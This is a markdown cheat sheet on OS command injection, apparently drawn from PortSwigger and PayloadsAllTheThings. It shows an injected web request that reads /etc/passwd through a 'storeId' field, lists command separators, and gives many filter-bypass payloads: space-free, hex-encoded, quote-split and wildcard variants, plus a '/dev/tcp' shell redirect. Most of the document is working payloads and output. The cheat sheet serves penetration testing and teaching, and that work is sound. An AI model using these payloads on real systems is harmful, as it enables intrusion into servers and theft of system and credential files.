 # OS Command Injection

> OS command injection or `"shell injection"` is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, which leads to expose some secrets or manipulate the data  

## Summary

- [OS Command Injection](#os-command-injection)
  - [Summary](#summary)
  - [Exploits](#exploits)
    - [Basic commands](#basic-commands)
    - [Useful commands](#useful-commands)
    - [Command Separator](#command-separator)
  - [Filter Bypasses](#filter-bypasses)
    - [Bypass without space](#bypass-without-space)
    - [Bypass with a line return](#bypass-with-a-line-return)
    - [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
    - [Bypass characters filter](#bypass-characters-filter)
    - [Bypass Blacklisted words](#bypass-blacklisted-words)
      - [Bypass with single quote](#bypass-with-single-quote)
      - [Bypass with double quote](#bypass-with-double-quote)
      - [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
      - [Bypass with $@](#bypass-with)
      - [Bypass with variable expansion](#bypass-with-variable-expansion)
      - [Bypass with wildcards](#bypass-with-wildcards)
  - [References](#references)
    



## Exploits

 :fire: **example :**

**Request :**
```bash
POST /product/stock HTTP/1.1
Host: sub.web-security-academy.net
Referer: https://sub.web-security-academy.net/product?productId=2
```
**Request Body :**
```bash
productId=2&storeId=1
```
**Modified Request Body :**
```bash
productId=2&storeId=1|cat /etc/passwd
```
**Response :**
```bash
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 1129

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### Basic commands

**Request :**
```bash
cat /etc/passwd
```
**Response :**
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```
### Useful commands 

| Purpose of command    | Linux       | Windows     |
|-----------------------|-------------|-------------|
| Name of current user  | whoami      | whoami      |
| Operating system      | uname -a    | ver         |
| Network configuration | ifconfig    | ipconfig    |
| Network connections   | netstat -an | netstat -an |
| Running processes     | ps -ef      | tasklist    |

### Command Separator

other separators (just try)

```bash
;
&&
&
|
||
0x0a
\n
```
**:warning: Note: Newline (0x0a or \n)**




:fire: **example :** 
```bash
productId=2&storeId=1&&cat /etc/passwd
productId=2&storeId=1||cat /etc/passwd
productId=2&storeId=1;cat /etc/passwd

```

## Filter Bypasses

### Bypass without space

Works on Linux only.

```bash
cat</etc/passwd

{cat,/etc/passwd}

cat$IFS/etc/passwd

echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd

X=$'uname\x20-a'&&$X

sh</dev/tcp/127.0.0.1/4242
```

Commands execution without spaces, $ or { } - Linux (Bash only)

```bash
IFS=,;`cat<<<uname,-a`
```

Works on Windows only.

```bash
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

### Bypass with a line return

```bash
something%0Acat%20/etc/passwd
```

### Bypass characters filter via hex encoding

linux
```bash
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
```
```bash
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
```
```bash
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
```
```bash
cat `xxd -r -p <<< 2f6574632f706173737764`
```
```bash
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

### Bypass characters filter

Commands execution without backslash and slash - linux bash

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```
```bash
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Bypass Blacklisted words

#### Bypass with single quote
```bash
w'h'o'am'i
```
#### Bypass with double quote
```bash
w"h"o"am"i
```
#### Bypass with backslash and slash
```bash
w\ho\am\i
/\b\i\n/////s\h
```
#### Bypass with $@

```bash
who$@ami
```

#### Bypass with variable expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### Bypass with wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```


## References
* [Portswigger](https://portswigger.net/web-security/os-command-injection)

* [PayloadsAllTheThings - By swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)